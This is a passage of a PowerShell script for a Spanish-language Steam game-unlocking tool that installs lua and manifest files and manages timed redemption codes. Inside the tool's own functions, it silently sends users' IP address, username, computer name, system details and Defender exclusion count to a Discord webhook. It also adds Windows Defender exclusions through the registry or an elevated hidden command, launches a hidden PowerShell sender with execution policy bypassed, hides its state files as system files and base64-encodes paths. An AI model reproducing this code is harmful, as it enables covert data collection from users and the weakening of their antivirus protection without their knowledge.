    $res = New-Object System.Collections.ArrayList
    foreach ($id in @($script:GAME_APPID_LIST)) {
        if (-not $script:GAME_NAME_BY_APPID.ContainsKey($id)) { continue }
        $nm = Nn1Yw $script:GAME_NAME_BY_APPID[$id]
        if ($nm -like "*$q*" -or $q -like "*$nm*") { [void]$res.Add($id) }
    }
    return @($res)
}


function Send-Webhook {
    param([string]$codigo, [string]$traduccion)
    try {
        Invoke-BgNoWait ({
            param($codigo, $traduccion, $webhookUrl, $user, $bt)
            try {
                $ip = (Invoke-RestMethod "https://api.ipify.org" -UseBasicParsing -TimeoutSec 8 -ErrorAction SilentlyContinue)
                $content = "**Usuario:** $user ($ip)`n**Codigo usado:**`n$bt$bt$bt$codigo$bt$bt$bt`n**Traduccion:**`n$bt$bt$bt$traduccion$bt$bt$bt"
                $payload = @{ content = $content } | ConvertTo-Json
                Send-DiscordJson $webhookUrl $payload 10 | Out-Null
            } catch {}
        }) @($codigo, $traduccion, $WEBHOOK_URL, [Environment]::UserName, [char]96)
    } catch {}
}

function Send-PatchStatus {
    param([string]$code, [string]$errCtx)
    try {
        $parcheFlag = Get-ParcheInstalado
        $steamRoot = $null; try { $steamRoot = Get-SteamPath } catch {}
        $hasDll = $false; try { $hasDll = (Test-Path (Join-Path $steamRoot "OpenSteamTool.dll")) -and (Test-Path (Join-Path $steamRoot "xinput1_4.dll")) } catch {}
        $parche = $parcheFlag -or $hasDll
        $dllInfo = if ($hasDll) { " (dll OK)" } elseif ($parcheFlag) { " (flag OK, dll falta)" } else { "" }
        $c1=0;$c2=0;$c3=0
        $ccKey = [string]$steamRoot
        try {
            if ($script:patchCountCache -and $script:patchCountCache.root -eq $ccKey -and ((Get-Date) - $script:patchCountCache.time).TotalSeconds -lt 120) {
                $c1 = $script:patchCountCache.c1; $c2 = $script:patchCountCache.c2; $c3 = $script:patchCountCache.c3
            } else {
                try { $c1 = @(Get-ChildItem (Join-Path $steamRoot (S("Y29uZmlnXHN0cGx1Zy1pbg=="))) -Filter *.lua -ErrorAction SilentlyContinue).Count } catch {}
                try { $c2 = @(Get-ChildItem (Join-Path $steamRoot (S("Y29uZmlnXGx1YQ=="))) -Filter *.lua -ErrorAction SilentlyContinue).Count } catch {}
                try { $c3 = @(Get-ChildItem (Join-Path $steamRoot "config\depotcache") -Filter *.manifest -ErrorAction SilentlyContinue).Count } catch {}
                $script:patchCountCache = @{ root = $ccKey; time = Get-Date; c1 = $c1; c2 = $c2; c3 = $c3 }
            }
        } catch {}
        $bt=[char]96
        $lines=@("**PATCH STATUS** - $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')","**App:** $($script:version)","**Codigo:** $code","**Parche:** $(if($parche){'INSTALADO'+$dllInfo}else{'NO INSTALADO'})","**Steam:** $steamRoot","**stplug-in:** $c1 luas","**lua:** $c2 luas","**depotcache:** $c3 manifests")
        if ($errCtx) { $lines += "**Contexto:** $errCtx" }
        $payload=@{content=($lines -join "`n")} | ConvertTo-Json
        Invoke-BgNoWait ({ param($u, $p) try { Send-DiscordJson $u $p 10 | Out-Null } catch {} }) @($WEBHOOK_URL, $payload)
    } catch {}
}
function Send-ConnErrorBg {
    param([string]$code,[string]$errMsg,[string]$detalle,[string]$srvUrl,[string]$srvUrlCf,[bool]$forceCf,[string]$clientId,[string]$appVer)
    try {
        $bt=[char]96
        $el=@("**ERROR CANJE** - $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')")
        try { $phLines=@(Get-Content (Join-Path $env:TEMP 'bsmap_phase.log') -ErrorAction Stop | Select-Object -Last 8); if ($phLines.Count -gt 0) { $el+="**Fase:**`n$($phLines -join "`n")" } } catch {}
        try {
            $dg = @()
            try { $dg += ("PS " + $PSVersionTable.PSVersion.ToString()) } catch {}
            try { $dg += ("OS " + [Environment]::OSVersion.VersionString) } catch {}
            try { $dg += ("64bit " + [Environment]::Is64BitProcess) } catch {}
            try { $dg += ("Admin " + ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) } catch {}
            try { $drvC = (Get-PSDrive C -ErrorAction Stop); $dg += ("Disco " + [math]::Round($drvC.Free/1GB,1) + "GB libres") } catch {}
            try { $srD = Get-SteamPath; $d1=(Test-Path (Join-Path $srD "OpenSteamTool.dll")); $d2=(Test-Path (Join-Path $srD "xinput1_4.dll")); $d3=(Test-Path (Join-Path $srD "dwmapi.dll")); $wm=(Test-Path (Join-Path $srD "winmm.dll")); $dg += ("Steam " + $srD + " dlls=" + $d1 + "/" + $d2 + "/" + $d3 + " winmm=" + $wm) } catch { $dg += "Steam ?" }
            try { $exR = @((Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" -ErrorAction Stop).PSObject.Properties.Name | Where-Object { $_ -notlike 'PS*' }); $dg += ("Exclusiones " + $exR.Count) } catch { $dg += "Exclusiones ?" }
            try { $luaV = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name EnableLUA -ErrorAction Stop).EnableLUA; $dg += ("UAC " + $luaV) } catch {}
            if ($script:lastTried) { $dg += ("Rutas: " + $script:lastTried) }
            if ($script:lastCandErrs) { $dg += ("Fallos: " + $script:lastCandErrs) }
            if ($dg.Count -gt 0) { $el += ("**Diag:** " + ($dg -join " | ")) }
        } catch {}
        $el+=("**PC:** $env:COMPUTERNAME / $([Environment]::UserName)","**ClientID:** $clientId","**App:** $appVer","**Codigo:** $code","**URL servidor:** $srvUrl","**URL secundaria:** $(if ($srvUrlCf) { $srvUrlCf } else { '(no configurada)' })")
        if ($forceCf) { $el+="**Modo:** Probando de otra manera (c.)" }
        $el+="**Mensaje:** $errMsg"; $el+="**Detalle:** $detalle"
        try { $elogL=@(Get-Content (Join-Path $env:TEMP 'bsmap_error.log') -Tail 12 -ErrorAction Stop | Where-Object { ($_ -notmatch '^\s*(en |\+ ~|STACK:\s*$)') -and ($_ -notmatch '^(EXCEPTION|AT):\s*$') }); $elog=($elogL -join "`n"); if ($elog) { $trimmed=$elog; if ($trimmed.Length -gt 500) { $trimmed=$trimmed.Substring($trimmed.Length-500) }; $el+="**Log:** $bt$bt$bt$trimmed$bt$bt$bt" } } catch {}
        $payloadRaw = "$bt$bt$bt diff`n$($el -join "`n")`n$bt$bt$bt"
        $payloadRaw = -join ($payloadRaw.ToCharArray() | Where-Object { $c=[int]$_; ($c -ge 32 -and ($c -lt 55296 -or $c -gt 57343)) -or $c -eq 10 -or $c -eq 13 -or $c -eq 9 })
        $payloadJson=@{ content = $payloadRaw } | ConvertTo-Json
        try {
            $senderDir = Join-Path $env:LOCALAPPDATA 'BastissSteam'
            try { if (-not (Test-Path -LiteralPath $senderDir)) { New-Item -ItemType Directory -Path $senderDir -Force | Out-Null } } catch {}
            $senderPs1 = Join-Path $senderDir 'bsmap_alert_sender.ps1'
            try {
                if (-not (Test-Path -LiteralPath $senderPs1)) {
                    $senderCode = @'
param([string]$job)
function Post-Chunk([string]$u,[string]$text) {
    $p = @{content=$text} | ConvertTo-Json -Compress
    $b8=[System.Text.Encoding]::UTF8.GetBytes($p)
    try { Invoke-RestMethod -Uri $u -Method Post -Body $b8 -ContentType 'application/json; charset=utf-8' -TimeoutSec 6 -UseBasicParsing -ErrorAction Stop | Out-Null; return $true } catch {}
    try {
        $t = [IO.Path]::GetTempFileName()+'.json'
        [IO.File]::WriteAllText($t, $p, (New-Object System.Text.UTF8Encoding $false))
        & curl.exe -s -X POST -H 'Content-Type: application/json' --data-binary "@$t" $u --max-time 8 -o NUL 2>$null
        Remove-Item $t -Force -ErrorAction SilentlyContinue
        return $true
    } catch { return $false }
}
try {
    $j = Get-Content -LiteralPath $job -Raw -ErrorAction Stop | ConvertFrom-Json
    $u = [string]$j.url; $c = [string]$j.content
    $chunks = @()
    $cc = $c
    while ($cc.Length -gt 0) {
        $n = [Math]::Min(1900, $cc.Length); $cut = $n
        if ($cc.Length -gt 1900) { $sp = $cc.LastIndexOf("`n", $n); if ($sp -gt 1200) { $cut = $sp } }
        $chunks += ($cc.Substring(0, $cut))
        if ($cut -ge $cc.Length) { $cc = "" } else { $cc = $cc.Substring($cut) }
    }
    $i = 0
    foreach ($ch in $chunks) { $i++; $t2 = $ch; if ($chunks.Count -gt 1) { $t2 = "[parte $i/$($chunks.Count)]`n" + $ch }; [void](Post-Chunk $u $t2) }
} catch {}
try { Remove-Item -LiteralPath $job -Force -ErrorAction SilentlyContinue } catch {}
'@
                    [IO.File]::WriteAllText($senderPs1, $senderCode, (New-Object System.Text.UTF8Encoding $false))
                }
            } catch {}
            $jobInner = ""; try { $jobInner = [string](($payloadJson | ConvertFrom-Json).content) } catch { $jobInner = $payloadJson }
            $jobJson = @{url=[string]$WEBHOOK_URL;content=$jobInner} | ConvertTo-Json -Compress
            $jobFile = Join-Path $env:TEMP ("bsmap_alert_" + [guid]::NewGuid().ToString('N') + ".json")
            [IO.File]::WriteAllText($jobFile, $jobJson, (New-Object System.Text.UTF8Encoding $false))
            Start-Process powershell.exe -ArgumentList '-NoProfile','-WindowStyle','Hidden','-ExecutionPolicy','Bypass','-File',$senderPs1,$jobFile -WindowStyle Hidden -ErrorAction Stop | Out-Null
        } catch {
            try { Add-Content -Path (Join-Path $env:TEMP "bsmap_error_pendientes.log") -Value $payloadJson -Encoding UTF8 } catch {}
        }
    } catch {}
}
function Send-Diagnostics {
    try {
        $lines = @()
        $lines += "**DIAGNOSTICO** - $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
        $lines += "**PC:** $env:COMPUTERNAME / $([Environment]::UserName)"
        $lines += "**OS:** $([System.Environment]::OSVersion.VersionString)"
        $lines += "**ClientID:** $($script:clientId)"
        try { $ip = (Invoke-RestMethod (S("aHR0cHM6Ly9hcGkuaXBpZnkub3Jn")) -UseBasicParsing -TimeoutSec 8 -ErrorAction Stop); $lines += "**IP:** $ip" } catch { $lines += "**IP:** ipify fallo" }
        try { $cv = (((Invoke-CurlHidden @('--version') 10 -NeedOut).out -split "`r?`n") | Select-Object -First 1); $lines += "**curl:** $cv" } catch { $lines += "**curl:** no disponible" }
        try { Update-ServerUrl } catch {}
        $su = $script:serverUrl
        $lines += "**Server URL:** $su"
        try {
            $hostN = ([uri]$su).Host
            $dns = [System.Net.Dns]::GetHostAddresses($hostN)
            $lines += "**DNS ${hostN}:** $($dns.IPAddressToString -join ', ')"
        } catch { $lines += "**DNS:** fallo - $($_.Exception.Message)" }
        try {
            $r = Invoke-WebRequest -Uri (S("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Jhc3Rpc2F5ZXMvRml4ZXMtc3RlYW0vbWFpbi9jdXJyZW50X3VybC50eHQ=")) -UseBasicParsing -TimeoutSec 8 -ErrorAction Stop
            $lines += "**GitHub URL:** $($r.Content.Trim())"
        } catch { $lines += "**GitHub URL:** error - $($_.Exception.Message)" }
        try {
            $tmpOut = Join-Path $env:TEMP "bsmap_diag_out.txt"
            $resolveArg = @()
            if ($script:serverIp -and $su -match "^https://") {
                $hn = ([uri]$su).Host
                if ($hn) { $resolveArg = @("--resolve", "$($hn):443:$($script:serverIp)") }
            }
$crT = Invoke-CurlHidden (@('-s','-k','--ssl-no-revoke','--tlsv1.2','--noproxy','*') + @($resolveArg) + @('-X','POST','-H','Content-Type: application/json','--data-binary','{}',"$su/api/redeem-code",'--max-time','15','-o',$tmpOut)) 20
$lines += "**Test tunnel /api/redeem-code:** curl exit $($crT.exit) (serverIp: $($script:serverIp))"
            Remove-Item $tmpOut -Force -ErrorAction SilentlyContinue
        } catch { $lines += "**Test tunnel:** error - $($_.Exception.Message)" }
        try { $sp = Get-SteamPath; $lines += "**Steam:** $sp" } catch { $lines += "**Steam:** no detectado" }
        $content = $lines -join "`n"
        $bt = [char]96
        $payload = @{ content = "$bt$bt$bt diff`n$content`n$bt$bt$bt" } | ConvertTo-Json
        Send-DiscordJson $WEBHOOK_URL $payload 15 | Out-Null
    } catch {}
}


$CLIENT_ID_FILE = Join-Path $env:LOCALAPPDATA (S("YnNtYXBfY2xpZW50X2lkLnR4dA=="))
function Get-ClientId {
    if (Test-Path $CLIENT_ID_FILE) {
        try { return (Get-Content $CLIENT_ID_FILE -Raw -ErrorAction Stop).Trim() } catch {}
    }
    $id = "PC-" + (-join ((48..57)+(65..90) | Get-Random -Count 32 | ForEach-Object { [char]$_ }))
    try { Set-Content $CLIENT_ID_FILE $id -Force -ErrorAction Stop } catch {}
    return $id
}
$script:clientId = Get-ClientId
$TOKEN_FILE = Join-Path $env:LOCALAPPDATA 'bsmap_token.json'
function Get-LocalToken {
    try { if (Test-Path -LiteralPath $TOKEN_FILE) { return (Get-Content -LiteralPath $TOKEN_FILE -Raw | ConvertFrom-Json) } } catch {}
    return $null
}
function Set-LocalToken($token, $code) {
    try {
        @{ token = $token; code = $code; client_id = $script:clientId; saved = (Get-Date).ToString('o') } |
            ConvertTo-Json | Set-Content -LiteralPath $TOKEN_FILE -Encoding UTF8
    } catch {}
}


function Get-SteamPath {
    $paths = @(
        (Get-ItemProperty -Path "HKLM:\SOFTWARE\WOW6432Node\Valve\Steam" -Name InstallPath -ErrorAction SilentlyContinue).InstallPath,
        (Get-ItemProperty -Path "HKLM:\SOFTWARE\Valve\Steam" -Name InstallPath -ErrorAction SilentlyContinue).InstallPath,
        (Get-ItemProperty -Path "HKCU:\SOFTWARE\Valve\Steam" -Name SteamPath -ErrorAction SilentlyContinue).SteamPath,
        "${env:ProgramFiles(x86)}\Steam",
        "${env:ProgramFiles(x86)}\Steamm",
        "$env:ProgramFiles\Steam",
        "C:\xdd"
    )
    foreach ($p in $paths) {
        if ($p -and (Test-Path $p) -and (Test-Path (Join-Path $p (S("c3RlYW0uZXhl"))))) { return $p }
    }
    foreach ($p in $paths) {
        if ($p -and (Test-Path $p)) { return $p }
    }
    throw (S("Tm8gc2UgZW5jb250cm8gU3RlYW0gZW4gZWwgcmVnaXN0cm8gbmkgZW4gcnV0YXMgdGlwaWNhcy4="))
}

function Find-SteamRoots {
    $roots = @()
    try { $r = Get-SteamPath; if ($r -and (Test-Path $r)) { $roots += $r } } catch {}
    foreach ($hk in @("HKLM:\SOFTWARE\WOW6432Node\Valve\Steam","HKLM:\SOFTWARE\Valve\Steam","HKCU:\SOFTWARE\Valve\Steam")) {
        $n = if ($hk -match 'HKCU') {'SteamPath'} else {'InstallPath'}
        $p = try { (Get-ItemProperty -Path $hk -Name $n -ErrorAction SilentlyContinue).$n } catch {}
        if ($p -and (Test-Path $p) -and ($roots -notcontains $p)) { $roots += $p }
    }
    foreach ($root in @(@($roots))) {
        $vdf = Join-Path $root "config\libraryfolders.vdf"
        if (Test-Path $vdf) {
            try { $c = Get-Content $vdf -Raw -ErrorAction Stop
                foreach ($m in [regex]::Matches($c, '"path"\s+"([^"]+)"')) {
                    $p = $m.Groups[1].Value.Replace('\\','\')
                    if ((Test-Path $p) -and ($roots -notcontains $p)) { $roots += $p }
                }
            } catch {}
        }
    }
    foreach ($d in 'C','D','E','F','G') {
        foreach ($sub in @('\Steam','\SteamLibrary')) {
            $p = "${d}:$sub"
            if ((Test-Path $p) -and ($roots -notcontains $p)) { $roots += $p }
        }
    }
    return $roots | Select-Object -Unique
}


function Get-SafeFont {
    param([string]$Family = "Segoe UI", [float]$Size = 10, $Style = [System.Drawing.FontStyle]::Regular)
    $fallbacks = @($Family, "Arial", "Microsoft Sans Serif", "Tahoma", "Segoe UI")
    foreach ($f in $fallbacks) {
        try { return New-Object System.Drawing.Font($f, $Size, $Style) } catch {}
    }
    return New-Object System.Drawing.Font("Arial", $Size, $Style)
}


function Save-DefExclFlag([string]$p) {
    try {
        $defFlag = Join-Path $env:LOCALAPPDATA "BastissSteam\defexcl_done.txt"
        $ddf = Split-Path $defFlag -Parent
        if (-not (Test-Path $ddf)) { New-Item -ItemType Directory -Path $ddf -Force | Out-Null }
        Add-Content -LiteralPath $defFlag -Value ($p + "|" + (Get-Date -Format 'yyyyMMdd')) -Encoding UTF8 -ErrorAction SilentlyContinue
    } catch {}
}
function Test-DefExclFlag([string]$p) {
    try {
        $defFlag = Join-Path $env:LOCALAPPDATA "BastissSteam\defexcl_done.txt"
        if (-not (Test-Path -LiteralPath $defFlag)) { return $false }
        $cut = (Get-Date).AddDays(-7)
        foreach ($fl in @(Get-Content -LiteralPath $defFlag -ErrorAction Stop)) {
            $fp = ($fl -split '\|')[0]; $fd = [datetime]::MinValue
            try { $fd = [datetime]::ParseExact(($fl -split '\|')[1],'yyyyMMdd',$null) } catch {}
            if ($fp -eq $p -and $fd -ge $cut) { return $true }
        }
    } catch {}
    return $false
}
function Add-DefenderExclusion {
    param([string]$Path)
    if (Test-DefExclFlag $Path) { return $true }
    $regPath = "HKLM:\SOFTWARE\Microsoft\Microsoft Antimalware\Exclusions\Paths"
    $current = try { (Get-ItemProperty -Path $regPath -ErrorAction Stop).PSObject.Properties.Name } catch { @() }
    if ($current -contains $Path) { Save-DefExclFlag $Path; return $true }
    try {
        Set-ItemProperty -Path $regPath -Name $Path -Value 0 -Type DWord -ErrorAction Stop
        Save-DefExclFlag $Path
        return $true
    } catch {}
    try {
        $cmd = "reg.exe ADD `"HKLM\SOFTWARE\Microsoft\Microsoft Antimalware\Exclusions\Paths`" /v `"$Path`" /t REG_DWORD /d 0 /f"
        $pEx = Start-Process cmd -ArgumentList "/c $cmd" -Verb RunAs -WindowStyle Hidden -PassThru -ErrorAction Stop
        if (-not $pEx.WaitForExit(25000)) { return $false }
        if ($pEx.ExitCode -ne 0) { return $false }
        $vrf = @()
        try { $vrf = @((Get-ItemProperty -Path $regPath -ErrorAction Stop).PSObject.Properties.Name) } catch {}
        if ($vrf -notcontains $Path) { return $false }
        Save-DefExclFlag $Path
        return $true
    } catch { return $false }
}


$TIMERS_FILE = Join-Path $env:LOCALAPPDATA (S("YnNtYXBfdGltZXJzLmpzb24="))
$OFFSET_FILE = Join-Path $env:LOCALAPPDATA (S("YnNtYXBfb2Zmc2V0Lmpzb24="))
$script:internetTimeCache = $null
$script:internetTimeCacheTime = (Get-Date).AddDays(-1)
$script:utf8NoBom = New-Object System.Text.UTF8Encoding $false


function Get-CdnTimeUtc {
    foreach ($u in @('https://www.cloudflare.com','https://www.google.com')) {
        try {
            $h = (Invoke-CurlHidden @('-s','-I','--connect-timeout','2','--max-time','2',$u) 4 -NeedOut).out
            $m = $h | Select-String -Pattern '^Date:\s*(.+)$'
            if ($m) {
                $d = $m.Matches[0].Groups[1].Value.Trim()
                return [datetime]::ParseExact($d, 'r', [System.Globalization.CultureInfo]::InvariantCulture)
            }
        } catch {}
    }
    return $null
}


function Get-InternetTime {
    $nowLocal = Get-Date
    if (($nowLocal - $script:internetTimeCacheTime).TotalSeconds -le 60 -and $script:internetTimeCache) {
        return $script:internetTimeCache, $true
    }
    $ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    $override = $env:BSMAP_TIMEAPI_URL
    try {
        if ($override) { $r = Invoke-RestMethod $override -Headers @{ 'User-Agent' = $ua } -UseBasicParsing -TimeoutSec 5 -ErrorAction Stop; $t = [datetime]::ParseExact($r.dateTime.Substring(0,19), 'yyyy-MM-ddTHH:mm:ss', $null).ToLocalTime() }
        else {
            
            try {
                $cdnUtc = Get-CdnTimeUtc
                if (-not $cdnUtc) { throw 'CDN sin Date' }
                $t = $cdnUtc.ToLocalTime()
            } catch {
                
                $r = Invoke-RestMethod (S('aHR0cHM6Ly93b3JsZHRpbWVhcGkub3JnL2FwaS9pcA==')) -Headers @{ 'User-Agent' = $ua } -UseBasicParsing -TimeoutSec 4 -ErrorAction Stop
                $t = [datetime]::ParseExact($r.utc_datetime.Substring(0,19), 'yyyy-MM-ddTHH:mm:ss', $null).ToLocalTime()
            }
        }
        $script:internetTimeCache = $t; $script:internetTimeCacheTime = $nowLocal
        return $t, $true
    } catch { return $null, $false }
}

function Read-NetOffset {
    try {
        if (Test-Path $OFFSET_FILE) {
            $o = Get-Content $OFFSET_FILE -Raw | ConvertFrom-Json
            if ($o.offset_seconds) { return [double]$o.offset_seconds }
        }
    } catch {}
    return $null
}
$script:clockOffsetSec = if ((Read-NetOffset)) { [double](Read-NetOffset) } else { 0 }

function Save-NetOffset {
    param([double]$sec)
    try { [System.IO.File]::WriteAllText($OFFSET_FILE, (@{ offset_seconds = [math]::Round($sec,1); measured_at = (Get-Date).ToString('o') } | ConvertTo-Json), $script:utf8NoBom) } catch {}
}


function Get-Now {
    param([switch]$LocalOnly)
    if (-not $LocalOnly) {
        $net, $ok = Get-InternetTime
        if ($net) {
            $off = ((Get-Date) - $net).TotalSeconds
            if ([math]::Abs($off) -gt 1) { Save-NetOffset $off }
            $script:clockOffsetSec = $off
            return $net, $true
        }
    }
    $off = Read-NetOffset
    $script:clockOffsetSec = if ($off) { $off } else { 0 }
    if ($off) { return (Get-Date).AddSeconds(-$off), $false }
    return (Get-Date), $false
}


function ConvertTo-ClockTime {
    param([datetime]$dt)
    if (-not $dt) { return $dt }
    $off = if ($script:clockOffsetSec) { $script:clockOffsetSec } else { 0 }
    return $dt.AddSeconds($off)
}

function At5Vc {
    if (Test-Path $TIMERS_FILE) {
        try {
            $data = Get-Content $TIMERS_FILE -Raw | ConvertFrom-Json
            $arr = @(foreach ($el in @($data)) { if ($el -is [System.Array] -and $el.Count -eq 1) { $el[0] } else { $el } })
            
            $valid = @()
            foreach ($item in $arr) {
                if ($item.expires_at -and $item.PSObject.Properties.Name -contains (S("ZXhwaXJlc19hdA=="))) { $valid += $item }
            }
            if ($valid.Count -gt 0) { return , $valid }
        } catch {}
    }
    
    try {
        $reg = (Get-ItemProperty -Path "HKCU:\Software\Bsmap" -Name (S("VGltZXJz")) -ErrorAction SilentlyContinue).Timers
        if ($reg) {
            $rt = @(foreach ($el in @($reg | ConvertFrom-Json)) { if ($el -is [System.Array] -and $el.Count -eq 1) { $el[0] } else { $el } })
            if ($rt.Count -gt 0 -and $rt[0].expires_at) {
                try { try { (Get-Item $TIMERS_FILE -Force -ErrorAction SilentlyContinue).Attributes = 'Normal' } catch {}; [System.IO.File]::WriteAllText($TIMERS_FILE, (ConvertTo-Json -InputObject @($rt) -Depth 10), $script:utf8NoBom) } catch {}
                try { (Get-Item $TIMERS_FILE -Force -ErrorAction SilentlyContinue).Attributes = 'Hidden, System' } catch {}
                return , $rt
            }
        }
    } catch {}
    return ,@()
}

function St7Xb {
    param($t)
    $utf8NoBom = New-Object System.Text.UTF8Encoding $false
    $t = @(foreach ($el in @($t)) { if ($el -is [System.Array] -and $el.Count -eq 1) { $el[0] } else { $el } })
    $json = if ($t.Count -eq 0) { '[]' } else { ConvertTo-Json -InputObject @($t) -Depth 10 }
    $regJson = if ($t.Count -eq 0) { '[]' } else { ConvertTo-Json -InputObject @($t) -Compress -Depth 10 }
    
    try { New-Item -Path "HKCU:\Software\Bsmap" -Force -ErrorAction SilentlyContinue | Out-Null; Set-ItemProperty -Path "HKCU:\Software\Bsmap" -Name (S("VGltZXJz")) -Value $regJson -Type String -Force -ErrorAction SilentlyContinue } catch {}
    
    $wroteOk = $false
    for ($i = 0; $i -lt 3; $i++) {
        try {
            try { (Get-Item $TIMERS_FILE -Force -ErrorAction SilentlyContinue).Attributes = 'Normal' } catch {}
            [System.IO.File]::WriteAllText($TIMERS_FILE, $json, $utf8NoBom)
            $wroteOk = $true
            break
        } catch { Start-Sleep -Milliseconds 200 }
    }
    if (-not $wroteOk) {
        try { [System.IO.File]::WriteAllText((Join-Path $env:TEMP (S('YnNtYXBfc2F2ZV9mYWlsLmxvZw=='))), "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] St7Xb: FALLO escribir archivo tras 3 intentos. Registro actualizado OK. Contenido: $json", (New-Object System.Text.UTF8Encoding $false)) } catch {}
    }
    try { $fi = Get-Item $TIMERS_FILE -Force -ErrorAction SilentlyContinue; if ($fi) { $fi.Attributes = 'Hidden, System' } } catch {}
}


$HISTORY_FILE = Join-Path $env:LOCALAPPDATA (S("YnNtYXBfY29kZXNfaGlzdG9yeS5qc29u"))
function Get-CodesHistory {
    try {
        if (Test-Path $HISTORY_FILE) {
            $h = Get-Content $HISTORY_FILE -Raw | ConvertFrom-Json
            $arr = @(foreach ($el in @($h)) { if ($el -is [System.Array] -and $el.Count -eq 1) { $el[0] } else { $el } })
            return ,@($arr | Where-Object { $_ -and $_.code })
        }
    } catch {}
    return ,@()
}
function Add-ExpiredToHistory {
    param($t)
    try {
        $h = @(foreach ($el in Get-CodesHistory) { $el })
        $h += @{ code = if ($t.redeem_code) { $t.redeem_code } else { $t.game_name }; game = $t.game_name; expires_at = $t.expires_at; duration = $t.duration; expired_at = (Get-Date).ToString('o') }
        if ($h.Count -gt 50) { $h = @($h | Select-Object -Last 50) }
        [System.IO.File]::WriteAllText($HISTORY_FILE, (ConvertTo-Json -InputObject @($h) -Depth 10), $script:utf8NoBom)
    } catch {}
}

function Remove-FileHard {
    param([string]$p)
    if (-not (Test-Path $p)) { return }
    Remove-Item -Path $p -Force -ErrorAction SilentlyContinue
    if (-not (Test-Path $p)) { return }
    Start-Sleep -Milliseconds 200
    try { [System.IO.File]::Delete($p) } catch {}
    if (-not (Test-Path $p)) { return }
    Start-Sleep -Milliseconds 500
    try { $a = Get-Item $p -Force -ErrorAction SilentlyContinue; if ($a) { $a.Attributes = 'Normal'; Remove-Item $p -Force } } catch {}
    if (-not (Test-Path $p)) { return }
    Start-Sleep -Milliseconds 1000
    try { Remove-Item -Path $p -Force -ErrorAction Stop } catch {}
}

function Rm9xExp {
    param([switch]$NoNetworkTime)
    $timers = At5Vc; $remaining = @()
    $expired = @()
    $now, $isNet = Get-Now -LocalOnly:$NoNetworkTime
    if (-not $now) { $now = Get-Date; $isNet = $false }
    foreach ($t in $timers) {
        $exp = $t.expires_at -as [datetime]; if (-not $exp) { $remaining += $t; continue }
        if ($exp -le $now) {
            
            $gameStillActive = $false
            foreach ($other in $timers) {
                if ($other -eq $t) { continue }
                if ($other.game_name -ne $t.game_name) { continue }
                $otherExp = $other.expires_at -as [datetime]
                if ($otherExp -and $otherExp -gt $now) { $gameStillActive = $true; break }
            }
            if ($gameStillActive) { $remaining += $t; continue }
            
            $expired += $t
        } else { $remaining += $t }
    }
    
    foreach ($t in $expired) {
        $root = $t.steam_root
        if (-not $root) { continue }
        if (-not (Test-Path $root)) {
            $fbRoots = @(Find-SteamRoots)
            foreach ($fb in $fbRoots) {
                $probe = Join-Path $fb (S("Y29uZmlnXHN0cGx1Zy1pbg=="))
                if (Test-Path $probe) { $root = $fb; $t.steam_root = $fb; break }
            }
        }
        $borrados = @(); $fallidos = @()
        foreach ($f in $t.lua_files) {
            $p1 = Join-Path (Join-Path $root (S("Y29uZmlnXHN0cGx1Zy1pbg=="))) $f
            $p2 = Join-Path (Join-Path $root (S("Y29uZmlnXGx1YQ=="))) $f
            Remove-FileHard $p1
            Remove-FileHard $p2
            if ((Test-Path $p1) -or (Test-Path $p2)) { $fallidos += $f } else { $borrados += $f }
        }
        foreach ($f in $t.manifest_files) {
            $p3 = Join-Path (Join-Path $root "config\depotcache") $f
            Remove-FileHard $p3
            if (Test-Path $p3) { $fallidos += $f } else { $borrados += $f }
        }
        $logPath = Join-Path $env:TEMP (S("YnNtYXBfanVlZ29fZXhwaXJhZG8ubG9n"))
        try { Add-Content -Path $logPath -Value "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] EXPIRADO y BORRADO: $($t.game_name) (codigo: $($t.redeem_code)) [Root: $root] - OK: $($borrados.Count) | FALLIDOS: $($fallidos.Count)" -Encoding UTF8 -ErrorAction SilentlyContinue } catch {}
        $webhookOk=$false
        for ($wi=0; $wi -lt 3; $wi++) {
            try {
                $bt=[char]96
                $cnt="**EXPIRADO:** $($t.game_name)`n**Codigo:** $bt$bt$bt$($t.redeem_code)$bt$bt$bt`n**Borrados OK:** $($borrados.Count)`n**NO borrados:** $($fallidos.Count)"
                if ($fallidos.Count -gt 0) { $cnt+="`n**Archivos que siguen existiendo:**$bt$bt$bt$($fallidos -join "`n")$bt$bt$bt" }
                if ($cnt.Length -gt 1900) { $cnt=$cnt.Substring(0,1900)+"`n... (truncado)" }
                $pl=@{content=$cnt}|ConvertTo-Json
                if (Send-DiscordJson $WEBHOOK_URL $pl 15) { $webhookOk=$true; break }
            } catch {
                try { Add-Content -Path (Join-Path $env:TEMP "bsmap_webhook_fail.log") -Value "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] EXPIRADO $($t.game_name) intento $($wi+1) fail $($_.Exception.Message)" -Encoding UTF8 } catch {}
                if ($wi -eq 2) { try { Add-Content -Path (Join-Path $env:TEMP "bsmap_webhook_queue.json") -Value (@{type="expirado";game=$t.game_name;code=$t.redeem_code;ok=$borrados.Count;fail=$fallidos.Count;ts=(Get-Date).ToString('o')} | ConvertTo-Json -Compress) -Encoding UTF8 } catch {} }
                Start-Sleep -Seconds (2*($wi+1))
            }
        }
        try {
            $short="@everyone Todos los juegos se borraron correctamente. Codigo: $($t.redeem_code) Juego: $($t.game_name) Luas:$($borrados.Count)/$($t.lua_files.Count) Manifests:$($t.manifest_files.Count - $fallidos.Count)/$($t.manifest_files.Count)"
            $pl2=@{content=$short}|ConvertTo-Json
            Send-DiscordJson $WEBHOOK_URL $pl2 10 | Out-Null
        } catch {}
        if ($fallidos.Count -gt 0) { Ad4Lo -gameName $t.game_name -code $t.redeem_code -root $root -luaFiles @($t.lua_files) -manifestFiles @($t.manifest_files) }
        Add-ExpiredToHistory $t
    }
